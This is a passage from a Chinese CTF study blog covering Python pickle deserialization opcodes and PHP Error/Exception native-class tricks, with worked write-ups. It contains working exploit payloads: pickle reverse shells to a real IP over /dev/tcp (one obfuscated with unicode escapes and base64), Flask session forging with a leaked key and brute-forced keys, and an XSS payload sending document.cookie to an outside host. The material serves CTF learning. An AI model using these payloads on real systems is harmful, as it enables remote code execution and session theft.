<p><img src="/posts/2d71dd35/1763897697908-1e199e49-f12f-45a9-bbbd-4c136319e367.png" alt="img"></p>
<p>可以对应大佬列举的操作符的具体作用看，一定要看懂才会构造。</p>
<h5 id="一些命令执行的payload"><a href="#一些命令执行的payload" class="headerlink" title="一些命令执行的payload"></a>一些命令执行的payload</h5><ul>
<li>R：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;cos //获取全局变量导入os模块</span><br><span class="line">system  //需要调用的函数名</span><br><span class="line">(S&#x27;whoami&#x27; </span><br><span class="line">tR.&#x27;&#x27;&#x27; //转换成元组，并将whoami作为参数传入system</span><br></pre></td></tr></table></figure>

<ul>
<li>I：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27; //参数要传给接下来导入的whoami</span><br><span class="line">ios //看下文</span><br><span class="line">system //需要调用的函数</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>i：相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<ul>
<li>o:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>o:寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="不用使用opcode的题目"><a href="#不用使用opcode的题目" class="headerlink" title="不用使用opcode的题目"></a>不用使用opcode的题目</h3><h4 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h4><p>先看源代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3.6</span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask import Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;</span><br><span class="line"></span><br><span class="line">User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="line">    &#x27;uname&#x27;: &#x27;test&#x27;,</span><br><span class="line">    &#x27;is_admin&#x27;: 0,</span><br><span class="line">    &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))</span><br><span class="line">def index_handler():</span><br><span class="line">    if not session.get(&#x27;u&#x27;):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[&#x27;u&#x27;] = u</span><br><span class="line">    return &quot;/file?file=index.js&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))</span><br><span class="line">def file_handler():</span><br><span class="line">    path = request.args.get(&#x27;file&#x27;)</span><br><span class="line">    path = os.path.join(&#x27;static&#x27;, path)</span><br><span class="line">    if not os.path.exists(path) or os.path.isdir(path) \</span><br><span class="line">            or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path:</span><br><span class="line">        return &#x27;disallowed&#x27;</span><br><span class="line"></span><br><span class="line">    with open(path, &#x27;r&#x27;) as fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))</span><br><span class="line">def admin_handler():</span><br><span class="line">    try:</span><br><span class="line">        u = session.get(&#x27;u&#x27;)</span><br><span class="line">        if isinstance(u, dict):</span><br><span class="line">            u = b64decode(u.get(&#x27;b&#x27;))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    except Exception:</span><br><span class="line">        return &#x27;uhh?&#x27;</span><br><span class="line"></span><br><span class="line">    if u.is_admin == 1:</span><br><span class="line">        return &#x27;welcome, admin&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;who are you?&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2d71dd35/1763728556875-0af80ce4-957d-498c-b476-6ee5545d6c45.png" alt="img"></p>
<p>这是主要利用点，反序列化的位置，我们可以控制User这个类，执行恶意代码来获取flag</p>
<p>通过session进行注入，先要伪造session，那么就要找密钥了，利用文件包含读取环境变量</p>
<p><img src="/posts/2d71dd35/1763729427177-7966e616-8c39-48db-bd6c-9d6ffffd02fd.png" alt="img"></p>
<p>这里的非预期解，当没看见</p>
<p>secret key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure>

<p>对u中的b进行反序列化构造格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;u&quot;:&#123;&quot;b&quot;:&quot;payload&quot;&#125;&#125;</span><br><span class="line">User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="line">    &#x27;uname&#x27;: &#x27;test&#x27;,</span><br><span class="line">    &#x27;is_admin&#x27;: 0,</span><br><span class="line">    &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="line">    &#x27;__reduce__&#x27;: lambda o: (os.system, (&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.140.236.137/9999 0&gt;&amp;1&quot;&#x27;,))</span><br><span class="line">&#125;)</span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="line">    &#x27;uname&#x27;: &#x27;test&#x27;,</span><br><span class="line">    &#x27;is_admin&#x27;: 0,</span><br><span class="line">    &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="line">    &#x27;__reduce__&#x27;: lambda o: (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&gt;test&#x27;)&quot;,))</span><br><span class="line">&#125;)</span><br><span class="line">user=pickle.dumps(User())</span><br><span class="line">print(base64.b64encode(user).decode())</span><br></pre></td></tr></table></figure>

<p>emmm，反弹shell我是没弹出来但是能配合文件包含写文件，读flag</p>
<p><img src="/posts/2d71dd35/1763776840759-00b5140c-5223-4fe7-bb2c-8f5c903e457f.png" alt="img"></p>
<h4 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h4><p>先给出源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def getFlag():</span><br><span class="line">    payload = request.args.get(&quot;payload&quot;)</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))</span><br><span class="line">    return &quot;ganbadie!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def readFile():</span><br><span class="line">    filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;)</span><br><span class="line">    with open(filename, &#x27;r&#x27;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>

<p>禁用了os，这题有个非预期是进行文件读取</p>
<p><img src="/posts/2d71dd35/1764038320559-11ae8504-ec87-4ba4-8497-3f7d32164889.png" alt="img"></p>
<p>直接读取环境变量，得到flag</p>
<p>预期就是使用pickle了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;env | tee c&#x27;)&quot;,))</span><br><span class="line">a=A()</span><br><span class="line">a=pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(a))</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2d71dd35/1764039289948-f288d149-21dd-4153-9650-7536da2ac7fd.png" alt="img"></p>
<h3 id="使用opcode的题目"><a href="#使用opcode的题目" class="headerlink" title="使用opcode的题目"></a>使用opcode的题目</h3><h4 id="MTCTF-2022-easypickle"><a href="#MTCTF-2022-easypickle" class="headerlink" title="[MTCTF 2022]easypickle"></a>[MTCTF 2022]easypickle</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import pickle</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    with open(&#x27;app.py&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/calc&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def getFlag():</span><br><span class="line">    payload = request.args.get(&quot;payload&quot;)</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(b&#x27;os&#x27;, b&#x27;&#x27;))</span><br><span class="line">    return &quot;ganbadie!&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/readFile&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def readFile():</span><br><span class="line">    filename = request.args.get(&#x27;filename&#x27;).replace(&quot;flag&quot;, &quot;????&quot;)</span><br><span class="line">    with open(filename, &#x27;r&#x27;) as f:</span><br><span class="line">        return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>

<p>由于使用的密钥是四位随机字符串，可以进行爆破，先生成对应的字典</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">file_path=&#x27;./key.txt&#x27;</span><br><span class="line">with open(file_path, &#x27;w&#x27;) as f:</span><br><span class="line">    for i in range(1,100000):</span><br><span class="line">        key = os.urandom(2).hex()</span><br><span class="line">        f.write(&quot;\&quot;&#123;&#125;\&quot;\n&quot;.format(key))</span><br></pre></td></tr></table></figure>

<p>然后使用flask-unsign去爆破</p>
<p><img src="/posts/2d71dd35/1764040765219-5ccf2fb9-4d51-4c70-8038-a648e6a45203.png" alt="img"></p>
<p>成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4fd4</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2d71dd35/1764040849156-2d0df90b-996c-438f-97ee-18536b76384f.png" alt="img"></p>
<p>这里没有用到a，可以直接pickle反序列化</p>
<p>使用的payload应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>但是这题禁用了o并且没有文件读取，需要反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode = b&quot;&quot;&quot;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;</span><br><span class="line">o.</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>禁用了o可以用os去凑一下，但是反弹shell时会将i禁用，这时候我们就需要使用操作符V</p>
<p>使用os的话要遵循s操作符的用法所以要构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&quot;&quot;&quot;(S&#x27;key&#x27;</span><br><span class="line">S&#x27;val&#x27;</span><br><span class="line">dS&#x27;v&#x27;</span><br><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">V\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0038\u002e\u0031\u0034\u0030\u002e\u0032\u0033\u0036\u002e\u0031\u0033\u0037\u002f\u0039\u0039\u0039\u0039\u0020\u0030\u003e\u0026\u0031</span><br><span class="line">os.</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#123;&#x27;user&#x27;: &#x27;admin&#x27;,&#x27;ser_data&#x27;: &#x27;KFMna2V5JwpTJ3ZhbCcKZFMndicKKGNvcwpzeXN0ZW0KVlx1MDA2Mlx1MDA2MVx1MDA3M1x1MDA2OFx1MDAyMFx1MDAyZFx1MDA2OVx1MDAyMFx1MDAzZVx1MDAyNlx1MDAyMFx1MDAyZlx1MDA2NFx1MDA2NVx1MDA3Nlx1MDAyZlx1MDA3NFx1MDA2M1x1MDA3MFx1MDAyZlx1MDAzOFx1MDAyZVx1MDAzMVx1MDAzNFx1MDAzMFx1MDAyZVx1MDAzMlx1MDAzM1x1MDAzNlx1MDAyZVx1MDAzMVx1MDAzM1x1MDAzN1x1MDAyZlx1MDAzOVx1MDAzOVx1MDAzOVx1MDAzOVx1MDAyMFx1MDAzMFx1MDAzZVx1MDAyNlx1MDAzMQpvcy4K&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>伪造session</p>
<p>然后弹shell得到flag（我是没弹到，但是思路应该没问题）</p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
  </entry>
  <entry>
    <title>php原生类</title>
    <url>/posts/ab758827/</url>
    <content><![CDATA[<p>学习一下php原生类</p>
<h1 id="常用的php原生类"><a href="#常用的php原生类" class="headerlink" title="常用的php原生类"></a>常用的php原生类</h1><ol>
<li>Error</li>
<li>Exception</li>
<li>SoapClient</li>
<li>Directorylterator</li>
<li>SimpleXMLElement</li>
<li>ZipArchive</li>
<li>SplFileObject</li>
</ol>
<p>一个一个来跟着大佬博客学习</p>
<h1 id="使用Error-Exception内置类进行xss"><a href="#使用Error-Exception内置类进行xss" class="headerlink" title="使用Error&#x2F;Exception内置类进行xss"></a>使用Error&#x2F;Exception内置类进行xss</h1><h2 id="内置类Error"><a href="#内置类Error" class="headerlink" title="内置类Error"></a>内置类Error</h2><ul>
<li>使用于php7</li>
<li>开启报错</li>
</ul>
<p>Error类是 php 的一个内置类，用于自动自定义一个 Error，在 php7 的环境下可能会造成一个 xss 漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个 POP 链走到一半就走不通了，不如尝试利用这个来做一个 xss，其实还是有好一些 cms 会选择直接使用 echo  的写法，当 PHP 对象被当作一个字符串输出或使用时候（如echo object的时候）会触发 __toString 方法，这是一种挖洞的新思路。</p>
<p>对内置类Error xss的使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = unserialize($_POST[&#x27;cmd&#x27;]); //反序列化成对象</span><br><span class="line">echo $a; echo的时候触发__tostring</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = new error(&#x27;&lt;script&gt;alert(123)&lt;/script&gt;&#x27;);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765868832813-bac0997a-472a-4a90-bd65-2f07b1658f77.png" alt="img"></p>
<h2 id="内置类Exception"><a href="#内置类Exception" class="headerlink" title="内置类Exception"></a>内置类Exception</h2><ul>
<li>适用于php5，7</li>
<li>开启报错</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = unserialize($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">echo $a;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = new Exception(&#x27;&lt;script&gt;alert(123)&lt;/script&gt;&#x27;);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1765869113845-c5671d51-2ca7-4bfe-a617-99235d61ee83.png" alt="img"></p>
<p>成功触发</p>
<h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a>[BJDCTF 2nd]xss之光</h2><p>好像提到没环境了，那我们就把wp过一遍吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc = new Exception(&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;);</span><br><span class="line">echo urlencode(serialize($poc));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>其实就是使用xss执行window.open然后劫取cookie获得flag</p>
<h1 id="使用Error-Exception内置类绕过hash"><a href="#使用Error-Exception内置类绕过hash" class="headerlink" title="使用Error&#x2F;Exception内置类绕过hash"></a>使用Error&#x2F;Exception内置类绕过hash</h1><p>在上文中，我们已经认识了 Error 和 Exception 这两个 PHP 内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过 <code>md5()</code> 函数和 <code>sha1()</code> 函数的比较。这里我们就要详细的说一下这个两个错误类了。</p>
<h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p><strong>Error</strong> 是所有 PHP 内部错误类的基类，该类是在 PHP 7.0.0 中开始引入的。</p>
<p>类摘要</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error implements Throwable &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>类属性：</strong></p>
<ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/error.construct.php">Error::__construct</a> — 初始化 error 对象</li>
<li><a href="https://www.php.net/manual/zh/error.getmessage.php">Error::getMessage</a> — 获取错误信息</li>
<li><a href="https://www.php.net/manual/zh/error.getprevious.php">Error::getPrevious</a> — 返回先前的 Throwable</li>
<li><a href="https://www.php.net/manual/zh/error.getcode.php">Error::getCode</a> — 获取错误代码</li>
<li><a href="https://www.php.net/manual/zh/error.getfile.php">Error::getFile</a> — 获取错误发生时的文件</li>
<li><a href="https://www.php.net/manual/zh/error.getline.php">Error::getLine</a> — 获取错误发生时的行号</li>
<li><a href="https://www.php.net/manual/zh/error.gettrace.php">Error::getTrace</a> — 获取调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php">Error::getTraceAsString</a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.tostring.php">Error::__toString</a> — error 的字符串表达</li>
<li><a href="https://www.php.net/manual/zh/error.clone.php">Error::__clone</a> — 克隆 error</li>
</ul>
<h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p><strong>Exception</strong> 是所有异常的基类，该类是在 PHP 5.0.0 中开始引入的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exception &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>类属性：</strong></p>
<ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/exception.construct.php">Exception::__construct</a> — 异常构造函数</li>
<li><a href="https://www.php.net/manual/zh/exception.getmessage.php">Exception::getMessage</a> — 获取异常消息内容</li>
<li><a href="https://www.php.net/manual/zh/exception.getprevious.php">Exception::getPrevious</a> — 返回异常链中的前一个异常</li>
<li><a href="https://www.php.net/manual/zh/exception.getcode.php">Exception::getCode</a> — 获取异常代码</li>
<li><a href="https://www.php.net/manual/zh/exception.getfile.php">Exception::getFile</a> — 创建异常时的程序文件名称</li>
<li><a href="https://www.php.net/manual/zh/exception.getline.php">Exception::getLine</a> — 获取创建的异常所在文件中的行号</li>
<li><a href="https://www.php.net/manual/zh/exception.gettrace.php">Exception::getTrace</a> — 获取异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php">Exception::getTraceAsString</a> — 获取字符串类型的异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.tostring.php">Exception::__toString</a> — 将异常对象转换为字符串</li>
<li><a href="https://www.php.net/manual/zh/exception.clone.php">Exception::__clone</a> — 异常克隆</li>
</ul>
<p>我们可以看到，在 Error 和 Exception 这两个 PHP 原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>我们以 Error 为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new Error(&quot;payload&quot;,1);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="/posts/ab758827/1765872113859-8d2458ef-45a5-4d97-b7fe-d646cd69269f.png" alt="img"></p>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>在来看看下一个例子：</p>
<p><img src="/posts/ab758827/1765872266165-065540a8-5c3a-494d-89b3-514aae8f904b.png" alt="img">可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
<p>Error 和 Exception 类的这一点在绕过在PHP类中的哈希比较时很有用，具体请看下面这道例题。</p>
<h2 id="0xgame2025-Rubbish-Unser"><a href="#0xgame2025-Rubbish-Unser" class="headerlink" title="[0xgame2025]Rubbish_Unser"></a>[0xgame2025]Rubbish_Unser</h2><p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ZZZ</span><br><span class="line">&#123;</span><br><span class="line">    public $yuzuha;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HSR</span><br><span class="line">&#123;</span><br><span class="line">    public $robin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HI3rd</span><br><span class="line">&#123;</span><br><span class="line">    public $RaidenMei=&#x27;1&#x27;;</span><br><span class="line">    public $kiana=1;</span><br><span class="line">    public $guanxing;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GI</span><br><span class="line">&#123;</span><br><span class="line">    public $furina;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mi</span><br><span class="line">&#123;</span><br><span class="line">    public $game;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new ZZZ();</span><br><span class="line">$a-&gt;yuzuha = new Mi();</span><br><span class="line">$a-&gt;yuzuha-&gt;game = new GI();</span><br><span class="line">$a-&gt;yuzuha-&gt;game-&gt;furina  = new HI3rd();</span><br><span class="line">//$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;kiana=&#x27;1&#x27;;</span><br><span class="line">//$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;RaidenMei= 1;</span><br><span class="line">$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;guanxing= new HSR();</span><br><span class="line">$a-&gt;yuzuha-&gt;game-&gt;furina-&gt;guanxing-&gt;robin = &quot;system(&#x27;ls&#x27;);&quot;;</span><br><span class="line"></span><br><span class="line">$b=array($a,0);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/ab758827/1761741361926-2b337420-34bb-4e78-bf26-8d7f7cdd2ccd.png" alt="img"></p>
<p>md5绕过是php8的(和原生类 Error 有关 )</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=&#x27;1&#x27;;</span><br><span class="line">b=1</span><br><span class="line">或者</span><br><span class="line">a=0;</span><br><span class="line">b=0E1;</span><br></pre></td></tr></table></figure>

<p>这个题，我当时做的时候用的就是error类或者exception类，但是直接生成的exp需要去掉一些东西（ai去掉的，现在已经忘记了），然后url编码后，直接就可以打了</p>
<h2 id="江苏省第七届网络空间知识技能大赛决赛-web1"><a href="#江苏省第七届网络空间知识技能大赛决赛-web1" class="headerlink" title="[江苏省第七届网络空间知识技能大赛决赛]web1"></a>[江苏省第七届网络空间知识技能大赛决赛]web1</h2><p>第一个绕过使用均可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = new Error(&quot;&quot;,1);$b = new Error(&quot;&quot;,2);</span><br><span class="line"></span><br><span class="line">$a = NAN;</span><br><span class="line">$b = &quot;NAN&quot;;</span><br></pre></td></tr></table></figure>

<p>然后是date这里会卡住</p>
<p><img src="/posts/ab758827/1763444552064-c9a5b0e1-b0dd-4128-af9a-2245d3f6b426.png" alt="img"></p>
<p><img src="/posts/ab758827/1763444568568-1d32800b-0a01-4556-a0ec-766041864a9e.png" alt="img"></p>
<p>转义即可哦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class date&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new date();</span><br><span class="line">$a-&gt;a=NAN;</span><br><span class="line">$a-&gt;b=&#x27;NAN&#x27;;</span><br><span class="line">$a-&gt;file=&#x27;/\f\l\a\g&#x27;;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>这里就是两种方法都可以绕过</p>
